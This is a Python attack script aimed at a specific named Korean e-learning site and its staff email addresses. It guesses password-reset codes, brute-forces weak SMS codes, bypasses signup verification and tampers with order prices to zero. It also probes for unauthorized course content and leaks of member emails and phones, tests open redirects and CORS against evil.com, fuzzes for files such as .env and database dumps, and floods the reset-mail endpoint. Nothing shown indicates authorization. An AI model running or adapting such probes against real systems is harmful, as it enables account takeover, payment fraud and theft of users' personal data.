#!/usr/bin/env python3
"""us-campus.co.kr deep20 targeted probe"""
import requests, re, json, time, hashlib, itertools
import urllib3
urllib3.disable_warnings()

BASE = "https://us-campus.co.kr"
STATIC = "https://static.us-campus.co.kr"
H = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
OUT = []

def log(tag, msg):
    line = f"[{tag}] {msg}"
    OUT.append(line)
    print(line, flush=True)

def post(path, data=None, cookies=None, referer=None, extra=None):
    hdr = dict(H)
    if referer:
        hdr["Referer"] = referer
    if extra:
        hdr.update(extra)
    try:
        return requests.post(BASE + path, data=data or {}, headers=hdr,
                             cookies=cookies, verify=False, timeout=12)
    except Exception as e:
        return None

def get(path, **kw):
    try:
        return requests.get(BASE + path, headers=H, verify=False, timeout=12, **kw)
    except Exception as e:
        return None

# ── 1. Password reset token analysis ──
log("RESET", "=== confirmMail + ajaxSetPassword ===")
for email in ["dev@us-all.co.kr", "ansuho@us-all.co.kr", "thkim@us-all.co.kr"]:
    r = post("/member/confirmMail", {"email": email})
    if r:
        log("RESET", f"confirmMail {email} -> {r.text[:200]}")

# brute short confirmCode patterns
codes = ["dev", "reset", "test", "12345678", "abcdef12", "00000000",
         hashlib.md5(b"dev@us-all.co.kr").hexdigest()[:16],
         hashlib.md5(b"dev").hexdigest()[:16]]
for c in codes:
    r = post("/member/ajaxSetPassword", {"confirmCode": c, "password": "Test1234!", "confirmed": "Test1234!"})
    if r and "잘못된" not in r.text and "fail" not in r.text.lower():
        log("RESET-HIT", f"ajaxSetPassword code={c} -> {r.text}")

# ── 2. login/emailPattern on find_password (may leak code) ──
log("EMAILPATTERN", "=== login/emailPattern ===")
for email in ["dev@us-all.co.kr", "notexist@fake.com", "thkim@us-all.co.kr"]:
    r = post("/login/emailPattern", {"email": email}, referer=BASE + "/member/find_password")
    if r:
        log("EMAILPATTERN", f"{email} -> {r.text[:250]}")

# ── 3. signUp bypass without cellphone cert ──
log("SIGNUP", "=== signUp bypass attempts ===")
s = requests.Session(); s.verify = False
s.get(BASE + "/member/join")
# get cellphone cert code for unregistered number
r = post("/member/cellphoneCert", {"countryCode": "82", "cellphone": "01098765432"},
         cookies=s.cookies, referer=BASE + "/member/join")
cell_code = ""
if r:
    try:
        j = r.json(); cell_code = j.get("code", "")
        log("SIGNUP", f"cellphoneCert -> code={cell_code}")
    except: pass

# try signup with leaked cellphoneCertCode only (no certKey)
payloads = [
    {"platform": "EMAIL", "email": f"pentest{int(time.time())}@test.com",
     "cellphoneCertCode": cell_code, "cellphoneCertKey": "000000",
     "countryCode": "82", "cellphone": "01098765432",
     "password": "Test1234!@", "confirmed": "Test1234!@", "name": "test",
     "agreementMarketing": "false"},
    {"platform": "EMAIL", "email": f"pentest2{int(time.time())}@test.com",
     "cellphoneCertCode": cell_code, "cellphoneCertKey": "",
     "countryCode": "82", "cellphone": "01098765433",
     "password": "Test1234!@", "confirmed": "Test1234!@", "name": "test2"},
]
for p in payloads:
    r = post("/member/signUp", p, cookies=s.cookies, referer=BASE + "/member/join")
    if r:
        log("SIGNUP", f"signUp {p['email']} -> {r.text[:200]}")

# ── 4. Order / price tampering (nonmember) ──
log("ORDER", "=== order/nonmember price tamper ===")
item_info = json.dumps([{"product_id": "616", "opt_id": "1626", "item_id": "2", "item_quantity": 1}])
order_data = {
    "productId": "616",
    "productNo": "260323184412561021",
    "validItemId": "2b2c3948dab020906084652a4ab99839eb2310fcb9edab4880c9b88cb7494561a049d06dd944eedcab0b938e4edea7a1a4c5cb3dbc969b1c1383780f35449d50affedc2b16801ae11c48139b0096080594f895ab4da6cb99",
    "itemInfo": item_info,
    "itemId[]": "2",
    "item_price": "0",
    "totalPrice": "0",
}
r = requests.post(BASE + "/order/nonmember", data=order_data, verify=False, timeout=15, allow_redirects=False)
if r:
    log("ORDER", f"nonmember status={r.status_code} loc={r.headers.get('Location','')} len={len(r.text)} title={re.search(r'<title>([^<]+)', r.text).group(1) if re.search(r'<title>', r.text) else ''}")

# setOrder without login
r = post("/order/setOrder", {
    "validItemId": order_data["validItemId"],
    "itemInfo": item_info,
    "orderMethod": "CARD",
    "item_price": "1",
})
if r:
    log("ORDER", f"setOrder noauth -> {r.text[:300]}")

# ajaxValidZeroPriceProduct
for pid in ["616", "1", "0", "-1"]:
    r = post("/study/ajaxValidZeroPriceProduct", {"productId": pid})
    if r:
        log("ORDER", f"ajaxValidZeroPriceProduct pid={pid} -> {r.text}")

# ── 5. Study content unauthorized ──
log("STUDY", "=== study APIs no auth ===")
codes = ["academy2026_u", "academy122", "616", "MS-001", "N35ENP62", "U4NE62SY"]
for code in codes:
    for id_val in ["616", "1", "5", code]:
        r = post("/study/contentsList", {"id": id_val, "code": code})
        if r and '"status":"success"' in r.text.replace(" ", ""):
            log("STUDY-HIT", f"contentsList id={id_val} code={code} len={len(r.text)}")
        r2 = post("/study/articleContent", {"articleCode": code})
        if r2 and '"status":"success"' in r2.text.replace(" ", ""):
            log("STUDY-HIT", f"articleContent {code} -> {r2.text[:200]}")
    r3 = post("/study/getMasterVodPlayer", {"code": code})
    if r3 and '"status":"success"' in r3.text.replace(" ", ""):
        log("STUDY-HIT", f"getMasterVodPlayer {code} -> {r3.text[:200]}")

# vodList / vodWatched
for sid in ["1", "616", "1626"]:
    r = post("/study/vodList", {"studyMenuId": sid, "targetCate": "1"})
    if r and "vodList" in r.text and '"status":"success"' in r.text.replace(" ", ""):
        log("STUDY-HIT", f"vodList sid={sid} -> {r.text[:250]}")
for vid in ["1", "616", "100", "1000"]:
    r = post("/study/vodWatched", {"vodId": vid})
    if r:
        log("STUDY", f"vodWatched {vid} -> {r.text[:150]}")

# downLoadAttach fileId brute
for fid in ["1", "616", "100", "1000", "N35ENP62"]:
    r = post("/study/downLoadAttach", {"fileId": fid})
    if r and '"status":"success"' in r.text.replace(" ", ""):
        log("STUDY-HIT", f"downLoadAttach {fid} -> {r.text[:300]}")

# ── 6. Member / order IDOR ──
log("IDOR", "=== member/order IDOR ===")
idor_eps = [
    ("/member/getMember", {"id": "1"}),
    ("/member/info", {"id": "1"}),
    ("/member/detail", {"id": "1"}),
    ("/order/detail", {"orderId": "1"}),
    ("/order/info", {"orderId": "1"}),
    ("/order/list", {}),
    ("/my/orderList", {}),
    ("/my/payment", {}),
    ("/my/profile", {"id": "1"}),
    ("/notification/list", {}),
    ("/notification/all", {}),
]
for path, data in idor_eps:
    r = post(path, data)
    if r and r.status_code == 200:
        t = r.text.strip()
        if t and '"status":"success"' in t.replace(" ", "") and len(t) > 80:
            if any(k in t.lower() for k in ["email", "cellphone", "phone", "mobile", "@"]):
                log("IDOR-HIT", f"{path} {data} -> {t[:300]}")
            elif "order" in t.lower() or "payment" in t.lower():
                log("IDOR", f"{path} {data} -> {t[:200]}")

# ── 7. tantanselect SSO ──
log("SSO", "=== tantanselect ===")
for path in ["/member/tantanselectCert", "/member/tantanselectProc"]:
    r = post(path, {"id": "test", "password": "test"})
    if r:
        log("SSO", f"{path} -> {r.text[:200]}")

# ── 8. OAuth redirect open redirect ──
log("OAUTH", "=== OAuth redirect ===")
oauth_paths = [
    "/login/kakaoAuth?redirect=https://evil.com",
    "/login/googleAuth?redirect=https://evil.com",
    "/login/naverAuth?redirect=https://evil.com",
    "/login/kakaoAuth?state=https://evil.com",
    "/login/kakaoCallback?code=test&state=https://evil.com",
]
for p in oauth_paths:
    r = get(p, allow_redirects=False)
    if r:
        loc = r.headers.get("Location", "")
        if "evil.com" in loc:
            log("OAUTH-HIT", f"{p} -> {loc}")
        elif r.status_code in (301, 302, 303, 307):
            log("OAUTH", f"{p} -> {r.status_code} {loc[:120]}")

# ── 9. Board notice IDOR / SQLi ──
log("BOARD", "=== board IDOR ===")
notice_ids = ["230714171713398527", "240207150523433414", "260527165058292311",
              "1", "2", "999999999999999999"]
for nid in notice_ids:
    r = get(f"/board/notice/{nid}", allow_redirects=False)
    if r and r.status_code == 200 and len(r.text) > 500:
        log("BOARD", f"/board/notice/{nid} -> 200 len={len(r.text)}")
# adjacent snowflake
base = 260527165058292311
for delta in [-1, 1, -100, 100]:
    nid = str(base + delta)
    r = get(f"/board/notice/{nid}", allow_redirects=False)
    if r and r.status_code == 200 and "notice" in r.text.lower():
        log("BOARD", f"adjacent {nid} -> 200")

# ── 10. Hidden paths / debug ──
log("PATH", "=== path fuzz ===")
paths = [
    "/.env", "/.git/config", "/config.php", "/phpinfo.php", "/info.php",
    "/debug", "/trace", "/actuator", "/actuator/env", "/swagger-ui.html",
    "/api", "/api/v1", "/api/member", "/api/order", "/api/study",
    "/backup", "/dump.sql", "/db.sql", "/admin.php", "/manager",
    "/member/export", "/member/list", "/member/search",
    "/order/export", "/order/download",
    "/payment/callback", "/pg/callback", "/pg/return",
    "/cron", "/batch", "/health", "/status",
    "/member/ajaxSetPassword", "/member/resetPassword",
    "/member/find_password/reset", "/member/passwordReset",
    "/study/export", "/study/download",
    "/my/export", "/my/download",
    "/login/token", "/login/session",
    "/file/download", "/attach/download",
    "/upload", "/uploads", "/data",
    "/server-status", "/server-info",
    "/crossdomain.xml", "/sitemap.xml", "/robots.txt",
]
for p in paths:
    r = get(p, allow_redirects=False)
    if r and r.status_code not in (404, 403, 307, 301, 302) and len(r.content) > 20:
        ct = r.headers.get("content-type", "")
        log("PATH-HIT", f"{p} -> {r.status_code} ct={ct} len={len(r.content)} body={r.text[:100]}")

# ── 11. Static CDN deep ──
log("STATIC", "=== static CDN ===")
prefixes = ["vod", "video", "lecture", "hls", "media", "attach", "pdf", "files",
            "upload", "product_616", "course_616", "academy2026_u", "academy122",
            "616", "us-campus", "notice", "board"]
names = ["index", "1", "01", "intro", "preview", "sample", "main", "play",
         "academy2026_u", "N35ENP62", "U4NE62SY", "616"]
exts = [".mp4", ".m3u8", ".pdf", ".zip", ".json", ".xml"]
for pre in prefixes[:8]:
    for name in names[:6]:
        for ext in exts[:3]:
            p = f"/{pre}/{name}{ext}"
            try:
                rr = requests.head(STATIC + p, verify=False, timeout=4)
                if rr.status_code == 200:
                    log("STATIC-HIT", f"{p} ct={rr.headers.get('content-type')} len={rr.headers.get('content-length')}")
            except: pass

# ── 12. confirmMail rate limit on dev@ ──
log("FLOOD", "=== confirmMail flood dev@ ===")
for i in range(5):
    r = post("/member/confirmMail", {"email": "dev@us-all.co.kr"})
    if r:
        log("FLOOD", f"#{i} {r.text[:120]}")

# ── 13. chkCellphoneCert weak OTP ──
log("SMS", "=== chkCellphoneCert weak OTP ===")
s2 = requests.Session(); s2.verify = False
s2.get(BASE + "/member/join")
r = post("/member/cellphoneCert", {"countryCode": "82", "cellphone": "01087654321"},
         cookies=s2.cookies, referer=BASE + "/member/join")
code = ""
if r:
    try: code = r.json().get("code", "")
    except: pass
for otp in ["000000", "123456", "111111", "999999", "0000", "1234"]:
    r = post("/member/chkCellphoneCert", {"code": code, "certKey": otp},
             cookies=s2.cookies, referer=BASE + "/member/join")
    if r and '"status":"success"' in r.text.replace(" ", ""):
        log("SMS-HIT", f"chkCellphoneCert otp={otp} -> {r.text}")

# ── 14. CORS sensitive endpoints ──
log("CORS", "=== CORS ===")
for ep in ["/login/isLogin", "/member/confirmMail", "/study/contentsList"]:
    r = requests.post(BASE + ep, headers={**H, "Origin": "https://evil.com"},
                      data={"email": "test@test.com"}, verify=False, timeout=8)
    if r:
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        if acao:
            log("CORS-HIT", f"{ep} ACAO={acao}")

with open("/workspace/us-campus-recon/deep20_results.txt", "w") as f:
    f.write("\n".join(OUT))
print(f"\nDONE {len(OUT)} lines -> deep20_results.txt", flush=True)
